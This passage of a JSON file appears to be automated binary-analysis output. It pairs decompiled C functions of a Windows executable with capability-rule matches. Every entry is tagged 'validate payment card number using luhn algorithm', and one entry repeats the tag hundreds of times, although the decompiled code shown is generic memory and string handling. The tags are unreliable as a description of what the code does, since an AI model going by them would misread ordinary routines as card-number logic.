        "decompiled_code": "\nvoid __cdecl fcn.00406532(uint *arg_8h)\n\n{\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    arg_8h[4] = 0xffffffff;\n    arg_8h[5] = 0;\n    arg_8h[6] = 0;\n    arg_8h[7] = 0;\n    arg_8h[3] = 0;\n    return;\n}\n",
        "token_count": 117
    },
    "0040654b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040654b(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    uint *puVar1;\n    uint var_4h;\n    \n    if (arg_8h < in_ECX[5] || arg_8h == in_ECX[5]) {\n        puVar1 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            puVar1 = *in_ECX;\n        }\n        in_ECX[4] = arg_8h;\n        fcn.0040314d(puVar1, arg_ch, arg_8h);\n        *(puVar1 + arg_8h) = 0;\n    }\n    else {\n        fcn.004042f0(arg_8h, in_ECX, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00406596": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406596(int32_t arg_8h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    iVar3 = fcn.00402ad6();\n    if (arg_8h == *(iVar3 + 0x24)) {\n        uVar1 = *(arg_8h + 4);\n        iVar3 = fcn.00402ad6();\n        *(iVar3 + 0x24) = uVar1;\n    }\n    else {\n        iVar3 = fcn.00402ad6();\n        iVar3 = *(iVar3 + 0x24);\n        do {\n            piVar4 = iVar3 + 4;\n            iVar3 = *piVar4;\n            if (iVar3 == 0) {\n                fcn.00404e94();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        } while (arg_8h != iVar3);\n        *piVar4 = *(arg_8h + 4);\n    }\n    return;\n}\n",
        "token_count": 246
    },
    "0047c0e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.0047c0e6(uint arg_8h, ushort *arg_ch, ushort *arg_10h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t *in_ECX;\n    \n    if (arg_ch != arg_10h) {\n        do {\n            pcVar1 = *(*in_ECX + 0x10);\n            (**0x573000)(arg_8h, *arg_ch);\n            cVar2 = (*pcVar1)();\n            if (cVar2 != '\\0') {\n                return arg_ch;\n            }\n            arg_ch = arg_ch + 1;\n        } while (arg_ch != arg_10h);\n    }\n    return arg_ch;\n}\n",
        "token_count": 160
    },
    "004065fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004065fa(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    code **in_ECX;\n    \n    pcVar1 = *in_ECX;\n    (**0x573000)(arg_8h + 7U & 0xfffffff8);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 76
    },
    "0040663b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040663b(uint param_1, uint param_2, ulong param_3, ulong param_4, ulong param_5, uint param_6)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    uint in_stack_ffffff68;\n    uchar auStack144 [48];\n    ulong uStack96;\n    uint32_t uStack80;\n    uint32_t uStack20;\n    \n    arg_8h = param_6;\n    uStack20 = *0x56cca8 ^ &stack0xfffffff0;\n    iVar2 = fcn.00402f3b(param_1, &param_5, param_6);\n    if (iVar2 == 0) {\n        uStack80 = uStack80 & 0xffffffe3 | 3;\n        uStack96 = param_4;\n        fcn.004054e8(auStack144, &param_6, param_1, param_2, &param_3, &param_5, 0);\n        arg_8h = param_6;\n    }\n    iVar2 = fcn.004054d9(param_1);\n    cVar1 = fcn.00404840();\n    if ((cVar1 == '\\0') || (iVar2 == 0)) {\n        fcn.00403cec(iVar2);\n        fcn.004051a0(arg_8h, 0xffff);\n    }\n    else {\n        fcn.00404502(iVar2, param_2, param_3, param_3 >> 0x20, param_4, param_4 >> 0x20, param_5, param_5 >> 0x20, \n                     arg_8h);\n    }\n    fcn.00403085(in_stack_ffffff68);\n    return;\n}\n",
        "token_count": 400
    },
    "00406681": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406681(uint arg_8h)\n\n{\n    fcn.004061d1(0, arg_8h, 0, 10, 1);\n    return;\n}\n",
        "token_count": 46
    },
    "00406695": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406695(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    iVar2 = fcn.00405a92(*(in_ECX + 8) + 0x250, 0x55, arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        fcn.00405c68(arg_8h, arg_ch);\n        return;\n    }\n    fcn.004035f8(0, 0, 0, 0, 0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 156
    },
    "004066b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004066b8(void)\n\n{\n    fcn.004a8901(0, 0, 1);\n    return;\n}\n",
        "token_count": 33
    },
    "0040681b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040681b(uint *arg_8h, uint16_t *arg_ch, uint16_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    for (; arg_ch != arg_10h; arg_ch = arg_ch + 1) {\n        fcn.0040637f(*arg_ch);\n    }\n    *arg_8h = arg_14h;\n    arg_8h[1] = arg_18h;\n    return;\n}\n",
        "token_count": 112
    },
    "00406834": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406834(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    uint *arg_8h_00;\n    uint var_4h;\n    \n    if (arg_8h < in_ECX[5] || arg_8h == in_ECX[5]) {\n        arg_8h_00 = in_ECX;\n        if (7 < in_ECX[5]) {\n            arg_8h_00 = *in_ECX;\n        }\n        in_ECX[4] = arg_8h;\n        fcn.00404c50(arg_8h_00, arg_ch, arg_8h);\n        *(arg_8h_00 + arg_8h * 2) = 0;\n    }\n    else {\n        fcn.00403800(arg_8h, in_ECX, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "00406843": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00406843(uint noname_0, uchar *arg_ch, char *arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    char *pcVar2;\n    ushort *puVar3;\n    \n    *arg_ch = 0x25;\n    pcVar2 = arg_ch + 1;\n    if ((arg_14h & 0x20) != 0) {\n        *pcVar2 = '+';\n        pcVar2 = arg_ch + 2;\n    }\n    if ((arg_14h & 8) != 0) {\n        *pcVar2 = '#';\n        pcVar2 = pcVar2 + 1;\n    }\n    puVar3 = pcVar2 + 1;\n    if (*arg_10h == 'L') {\n        *pcVar2 = 'I';\n        *puVar3 = 0x3436;\n        puVar3 = pcVar2 + 3;\n    }\n    else {\n        *pcVar2 = *arg_10h;\n    }\n    if ((arg_14h & 0xe00) == 0x400) {\n        uVar1 = 0x6f;\n    }\n    else if ((arg_14h & 0xe00) == 0x800) {\n        uVar1 = ~(arg_14h << 3) & 0x20U | 0x58;\n    }\n    else {\n        uVar1 = arg_10h[1];\n    }\n    *puVar3 = uVar1;\n    *(puVar3 + 1) = 0;\n    return arg_ch;\n}\n",
        "token_count": 363
    },
    "0040686b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040686b(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.004cae5a(arg_8h, 7);\n        fcn.004cae5a(arg_8h + 0x1c, 7);\n        fcn.004cae5a(arg_8h + 0x38, 0xc);\n        fcn.004cae5a(arg_8h + 0x68, 0xc);\n        fcn.004cae5a(arg_8h + 0x98, 2);\n        fcn.00406302(*(arg_8h + 0xa0));\n        fcn.00406302(*(arg_8h + 0xa4));\n        fcn.00406302(*(arg_8h + 0xa8));\n        fcn.004cae5a(arg_8h + 0xb4, 7);\n        fcn.004cae5a(arg_8h + 0xd0, 7);\n        fcn.004cae5a(arg_8h + 0xec, 0xc);\n        fcn.004cae5a(arg_8h + 0x11c, 0xc);\n        fcn.004cae5a(arg_8h + 0x14c, 2);\n        fcn.00406302(*(arg_8h + 0x154));\n        fcn.00406302(*(arg_8h + 0x158));\n        fcn.00406302(*(arg_8h + 0x15c));\n        fcn.00406302(*(arg_8h + 0x160));\n    }\n    return;\n}\n",
        "token_count": 376
    },
    "0047c232": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint16_t * __cdecl fcn.0047c232(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t in_ECX;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            uVar1 = fcn.00401da2(*arg_8h, in_ECX + 8);\n            *arg_8h = uVar1;\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 135
    },
    "00484c05": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
